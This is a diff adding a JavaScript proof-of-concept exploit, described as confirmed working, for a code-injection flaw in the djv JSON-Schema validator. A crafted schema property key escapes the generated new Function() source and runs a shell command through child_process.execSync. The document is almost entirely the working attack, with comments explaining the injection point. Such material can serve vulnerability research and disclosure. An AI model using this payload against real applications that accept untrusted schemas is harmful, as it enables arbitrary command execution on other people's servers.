@@ -1,0 +1,33 @@
+Confirmed working end-to-end. Final exploit:
+
+```javascript
+const Environment = require("djv");
+
+// djv compiles JSON-Schema property names directly into the source text of a
+// `new Function(...)` call (see lib/validators/properties.js: `['${propertyKey}']`),
+// without any sanitization/escaping. A schema with an attacker-controlled
+// property key can therefore break out of the generated string literal and
+// inject arbitrary JavaScript that runs inside the compiled validator.
+
+const env = new Environment();
+
+const maliciousKey =
+  "']===undefined)){}; " +
+  "global.pwned = process.mainModule.require('child_process').execSync('id').toString(); " +
+  "//";
+
+const schema = {
+  type: "object",
+  properties: {
+    [maliciousKey]: { type: "string" }
+  }
+};
+
+// Compiles the malicious schema into a validator function via `new Function()`.
+env.addSchema("exploit", schema);
+
+// Triggers the injected code path (hasOwnProperty check on the malicious key).
+env.validate("exploit", { [maliciousKey]: "x" });
+
+console.log("Injected code executed with output:\n" + global.pwned);
+```
